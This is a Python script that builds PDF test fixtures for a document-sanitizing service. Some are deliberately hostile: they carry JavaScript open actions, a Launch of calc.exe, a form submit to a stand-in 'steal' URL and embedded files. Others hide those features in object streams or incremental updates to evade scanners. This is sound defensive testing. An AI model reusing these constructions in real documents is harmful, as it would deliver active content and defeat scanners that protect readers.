"""041. The PDFs the tests run against, drawn here and never real documents.

Run from apps/agent: `uv run python tests/fixtures/pdfs/make.py`. It writes
each fixture beside this file and copies the ones the Core API reads into
apps/core-api/test/fixtures/pdfs/, then reopens every file and asserts it has
what it claims, so a fixture that silently lost its script cannot make a
clean test pass.
"""

from __future__ import annotations

import io
import shutil
from pathlib import Path

import pikepdf
from pikepdf import Array, Dictionary, Name, String
from reportlab.graphics import renderPDF
from reportlab.graphics.barcode.qr import QrCodeWidget
from reportlab.graphics.shapes import Drawing
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

HERE = Path(__file__).parent
CORE = HERE.parents[3] / "core-api" / "test" / "fixtures" / "pdfs"

#: What the Core API's tests read.
FOR_CORE = [
    "boarding.pdf",
    "locked.pdf",
    "restricted.pdf",
    "pages1001.pdf",
    "offset.pdf",
    "hostile.pdf",
    "incremental.pdf",
    "objstm.pdf",
    "clean.pdf",
    "clean-stream-names.pdf",
]


def _pages(texts: list[list[str]], *, qr: str | None = None, size=A4) -> bytes:
    """A PDF with one page per list of lines, drawn with reportlab, and its
    creator stamped in the document information so cleaning has work to do."""
    out = io.BytesIO()
    c = canvas.Canvas(out, pagesize=size, invariant=1)
    c.setAuthor("Somebody Else")
    c.setCreator("fixture-maker")
    for lines in texts:
        y = size[1] - 72
        for line in lines:
            c.setFont("Helvetica", 12)
            c.drawString(72, y, line)
            y -= 18
        if qr:
            widget = QrCodeWidget(qr)
            d = Drawing(160, 160)
            d.add(widget)
            renderPDF.draw(d, c, 72, 120)
            qr = None
        c.showPage()
    c.save()
    return out.getvalue()


def boarding() -> bytes:
    return _pages(
        [
            [
                "BOARDING PASS",
                "Passenger: ANA SILVA",
                "Flight TP1336  Lisbon (LIS) to London (LHR)",
                "14 October  Departs 07:05  Gate 14  Seat 12A",
                "Booking reference LX3K9Q",
            ]
        ],
        qr="M1SILVA/ANA LX3K9Q LISLHRTP 1336 287Y012A",
    )


def ticket() -> bytes:
    return _pages(
        [
            [
                "Concert ticket",
                "Os Azeitonas, Coliseu dos Recreios",
                "Saturday 8 November, doors 20:00",
            ],
            ["Terms of entry", "No refunds. Bring this page or the QR code on page one."],
        ]
    )


def contract() -> bytes:
    pages = [
        [f"Rental agreement, clause {n}", "The tenant shall keep the flat in good order."]
        for n in range(1, 49)
    ]
    pages[0].append("Rent of 950 euros is due on the first of each month.")
    return _pages(pages)


def pages1001() -> bytes:
    pdf = pikepdf.new()
    for _ in range(1001):
        pdf.add_blank_page(page_size=(200, 200))
    out = io.BytesIO()
    pdf.save(out)
    return out.getvalue()


def locked() -> bytes:
    pdf = pikepdf.open(io.BytesIO(boarding()))
    out = io.BytesIO()
    pdf.save(out, encryption=pikepdf.Encryption(user="secret", owner="owner", R=6))
    return out.getvalue()


def restricted() -> bytes:
    """Encrypted against printing and copying, with no password to open it,
    which banks send and which is not locked."""
    pdf = pikepdf.open(io.BytesIO(boarding()))
    out = io.BytesIO()
    pdf.save(
        out,
        encryption=pikepdf.Encryption(
            user="",
            owner="owner",
            R=6,
            allow=pikepdf.Permissions(print_lowres=False, print_highres=False, extract=False),
        ),
    )
    return out.getvalue()


def offset() -> bytes:
    """A real PDF behind eight bytes of something else."""
    return b"GARBAGE!" + boarding()


def _js(pdf: pikepdf.Pdf, code: str) -> Dictionary:
    return pdf.make_indirect(Dictionary(Type=Name.Action, S=Name.JavaScript, JS=String(code)))


def _hostile_pdf() -> pikepdf.Pdf:
    """Every item on the clean copy's kill list, on one page of the boarding pass."""
    pdf = pikepdf.open(io.BytesIO(boarding()))
    root = pdf.Root
    page = pdf.pages[0]

    # Metadata and piece information, on the document and on the page.
    with pdf.open_metadata(set_pikepdf_as_editor=False) as meta:
        meta["dc:creator"] = ["Somebody Else"]
    root.PieceInfo = Dictionary(App=Dictionary(LastModified=String("D:20260101")))
    page.obj.PieceInfo = Dictionary(App=Dictionary(LastModified=String("D:20260101")))

    # Scripts: document level, on open, and on the page.
    root.Names = Dictionary(
        JavaScript=Dictionary(Names=Array([String("hi"), _js(pdf, "app.alert(1)")]))
    )
    root.OpenAction = _js(pdf, "app.alert(2)")
    root.AA = Dictionary(WC=_js(pdf, "app.alert(3)"))
    page.obj.AA = Dictionary(O=_js(pdf, "app.alert(4)"))

    # An embedded file, in the name tree and as an annotation.
    ef = pdf.make_stream(b"secret attachment")
    ef.Type = Name.EmbeddedFile
    filespec = pdf.make_indirect(
        Dictionary(Type=Name.Filespec, F=String("a.txt"), EF=Dictionary(F=ef))
    )
    root.Names.EmbeddedFiles = Dictionary(Names=Array([String("a.txt"), filespec]))

    rect = Array([72, 72, 200, 100])
    annots = [
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Link,
            Rect=rect,
            A=Dictionary(S=Name.Launch, F=String("calc.exe")),
        ),
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Link,
            Rect=rect,
            A=Dictionary(S=Name.URI, URI=String("https://example.com/x")),
        ),
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Link,
            Rect=rect,
            A=Dictionary(S=Name.GoToR, F=String("other.pdf"), D=Array([0, Name.Fit])),
        ),
        Dictionary(Type=Name.Annot, Subtype=Name.FileAttachment, Rect=rect, FS=filespec),
        Dictionary(Type=Name.Annot, Subtype=Name.RichMedia, Rect=rect),
        Dictionary(Type=Name.Annot, Subtype=Name.Screen, Rect=rect, A=Dictionary(S=Name.Movie)),
        Dictionary(
            Type=Name.Annot, Subtype=Name.Link, Rect=rect, AA=Dictionary(E=_js(pdf, "app.alert(5)"))
        ),
    ]
    field = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Widget,
            FT=Name.Tx,
            T=String("name"),
            V=String("filled"),
            Rect=rect,
            A=Dictionary(S=Name.SubmitForm, F=String("https://example.com/steal")),
        )
    )
    imported = Dictionary(
        Type=Name.Annot,
        Subtype=Name.Link,
        Rect=rect,
        A=Dictionary(S=Name.ImportData, F=String("d.fdf")),
    )
    page.obj.Annots = pdf.make_indirect(
        Array([pdf.make_indirect(a) for a in annots] + [field, pdf.make_indirect(imported)])
    )
    root.AcroForm = Dictionary(Fields=Array([field]), XFA=pdf.make_stream(b"<xdp:xdp/>"))
    return pdf


def hostile() -> bytes:
    out = io.BytesIO()
    _hostile_pdf().save(out, object_stream_mode=pikepdf.ObjectStreamMode.disable)
    return out.getvalue()


def objstm() -> bytes:
    """The hostile PDF with its dictionaries inside compressed object streams,
    where a scan of the raw bytes would see none of them."""
    out = io.BytesIO()
    _hostile_pdf().save(out, object_stream_mode=pikepdf.ObjectStreamMode.generate)
    return out.getvalue()


def incremental() -> bytes:
    """The boarding pass, then an incremental update appended by hand that
    gives the catalog an open action running a script. A tool that rewrites
    only the first revision, or a scan that reads only the last, misses it."""
    base = boarding()
    pdf = pikepdf.open(io.BytesIO(base))
    root_num = pdf.Root.objgen[0]
    size = int(pdf.trailer.Size)
    pages_num = pdf.Root.Pages.objgen[0]

    js_num = size
    body = io.BytesIO()
    start = len(base)
    offsets: dict[int, int] = {}
    offsets[js_num] = start + body.tell()
    action = "<< /Type /Action /S /JavaScript /JS (app.alert\\(6\\)) >>"
    body.write(f"{js_num} 0 obj\n{action}\nendobj\n".encode())
    offsets[root_num] = start + body.tell()
    catalog = f"<< /Type /Catalog /Pages {pages_num} 0 R /OpenAction {js_num} 0 R >>"
    body.write(f"{root_num} 0 obj\n{catalog}\nendobj\n".encode())
    xref_at = start + body.tell()
    xref = io.BytesIO()
    xref.write(b"xref\n")
    for num in sorted(offsets):
        xref.write(f"{num} 1\n{offsets[num]:010d} 00000 n \n".encode())
    prev = base.rfind(b"startxref")
    prev_offset = int(base[prev:].split()[1])
    trailer = f"<< /Size {js_num + 1} /Root {root_num} 0 R /Prev {prev_offset} >>"
    xref.write(f"trailer\n{trailer}\nstartxref\n{xref_at}\n%%EOF\n".encode())
    return base + (b"" if base.endswith(b"\n") else b"\n") + body.getvalue() + xref.getvalue()


def clean_copy() -> bytes:
    """The worker's own clean copy of the boarding pass, as the Core API
    receives it."""
    from offload_agent.pdfs import clean

    return clean(boarding())


def clean_stream_names() -> bytes:
    """A clean copy whose page content, which is stream data, happens to hold
    the bytes of names on the kill list. A scan that does not skip stream
    data would refuse it; stream bytes are drawing, never a dictionary."""
    from offload_agent.pdfs import verify

    pdf = pikepdf.open(io.BytesIO(clean_copy()))
    pdf.pages[0].contents_add(pdf.make_stream(b"% /JS /OpenAction /Launch\n"), prepend=False)
    out = io.BytesIO()
    pdf.save(out, object_stream_mode=pikepdf.ObjectStreamMode.disable, compress_streams=False)
    verify(out.getvalue())
    return out.getvalue()


FIXTURES = {
    "boarding.pdf": boarding,
    "ticket.pdf": ticket,
    "contract.pdf": contract,
    "pages1001.pdf": pages1001,
    "locked.pdf": locked,
    "restricted.pdf": restricted,
    "offset.pdf": offset,
    "hostile.pdf": hostile,
    "objstm.pdf": objstm,
    "incremental.pdf": incremental,
    "clean.pdf": clean_copy,
    "clean-stream-names.pdf": clean_stream_names,
}


def _assert_claims() -> None:
    def opened(name: str, **kw) -> pikepdf.Pdf:
        return pikepdf.open(HERE / name, **kw)

    assert len(opened("boarding.pdf").pages) == 1
    assert len(opened("ticket.pdf").pages) == 2
    assert len(opened("contract.pdf").pages) == 48
    assert len(opened("pages1001.pdf").pages) == 1001
    try:
        opened("locked.pdf")
    except pikepdf.PasswordError:
        pass
    else:
        raise AssertionError("locked.pdf opened without its password")
    restricted_pdf = opened("restricted.pdf")
    assert restricted_pdf.is_encrypted and not restricted_pdf.allow.print_highres
    assert not (HERE / "offset.pdf").read_bytes().startswith(b"%PDF-")
    hostile_pdf = opened("hostile.pdf")
    for key in ("/OpenAction", "/AA", "/Names", "/AcroForm", "/Metadata", "/PieceInfo"):
        assert key in hostile_pdf.Root, key
    assert "/Author" in hostile_pdf.docinfo
    assert b"/ObjStm" in (HERE / "objstm.pdf").read_bytes()
    assert b"/OpenAction" not in (HERE / "objstm.pdf").read_bytes(), (
        "objstm.pdf should hide its dictionaries"
    )
    inc = (HERE / "incremental.pdf").read_bytes()
    assert inc.count(b"startxref") == 2
    assert b"/JS /OpenAction" in (HERE / "clean-stream-names.pdf").read_bytes()
    inc_pdf = opened("incremental.pdf")
    assert "/OpenAction" in inc_pdf.Root


def main() -> None:
    CORE.mkdir(parents=True, exist_ok=True)
    for name, make in FIXTURES.items():
        (HERE / name).write_bytes(make())
    _assert_claims()
    for name in FOR_CORE:
        shutil.copyfile(HERE / name, CORE / name)
    print(f"wrote {len(FIXTURES)} fixtures, copied {len(FOR_CORE)} to the Core API")


if __name__ == "__main__":
    main()
